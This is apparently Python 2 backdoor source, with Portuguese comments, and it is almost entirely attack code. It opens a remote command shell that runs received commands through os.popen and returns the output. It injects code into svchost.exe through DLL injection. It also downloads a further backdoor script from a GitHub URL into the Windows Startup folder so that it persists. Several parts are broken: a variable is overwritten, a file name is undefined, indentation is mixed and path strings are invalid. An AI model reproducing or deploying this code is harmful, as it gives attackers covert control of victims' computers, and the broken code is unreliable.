import socket
import os
import sys
from time import sleep
connected = True
import getpass
import time
import ctypes.util
from winappdbg import Process, System
import urllib2

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

while True:
	try:
		while True:
			s.connect_ex(("127.0.0.1", 666))
			dados = s.recv(2048)
			attack = os.popen(dados)
			s.send(attack.read())
			user = getpass.getuser()
			host=socket.gethostname()
			s.send(user+"@"+host+": ")

			if dados.startswith("cd"):
				os.chdir(dados[3:].replace('\n',''))
				s.send("\n Changing directory to " + str(os.getcwd())+"\n")
				result='\n'

			if dados.startswith("pwd"):
				s.send("\n"+str(os.getcwd)+"\n")
			if os.name == 'nt':
				try:
					# Injetando codigo
					python_lib = "python{0}{1}.dll".format(sys.version_info.major, sys.version_info.minor)
					python_dll = ctypes.util.find_library(python_lib)
    					s = System()
    					s.scan_processes()
    					pl = s.find_processes_by_filename("svchost.exe")
    					pid = pl[0][0].get_pid()
    					p = Process(pid)
    					print('pid', pid)
    					print('arch', p.get_bits())
    					t = p.inject_dll(python_dll)
    					p.scan_modules()
    					m = p.get_module_by_name(python_lib)
    					init = m.resolve("Py_InitializeEx")
    					pyrun = m.resolve("PyRun_SimpleString")
    					print(init, pyrun)
    					p.start_thread(init, 0)
    					time.sleep(0.1)
    					sh = 'import subprocess; subprocess.call("svchost.exe")'
    					addr = p.malloc(len(sh))
    					p.write(addr, sh)
					p.start_thread(pyrun, addr)

					# Movendo o backdoor pro startup
					if dados.startswith("move_startup"):
						url = "https://raw.githubusercontent.com/DedSec-F0x/DedSec-Framework/master/exploit/python/backdoortop.py"
						user = getpass.getuser()
						os.chdir("C:\Users\" + user + "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\")
						u = urllib2.urlopen(url)
						f = open(file_name, 'wb')
						meta = u.info()
						file_size = int(meta.getheaders("Content-Length")[0])
						print "Downloading: %s Bytes: %s" % (file_name, file_size)
						file_size_dl = 0
						block_sz = 8192
						while True:
    							buffer = u.read(block_sz)
    							if not buffer:
        							break

							file_size_dl += len(buffer)
    							f.write(buffer)
    							status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
    							status = status + chr(8)*(len(status)+1)
   						 	print status,

						f.close()
				else:
					pass
	except socket.error:
		connected = False
		while not connected:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				connected = True
			except:
				sleep(2)
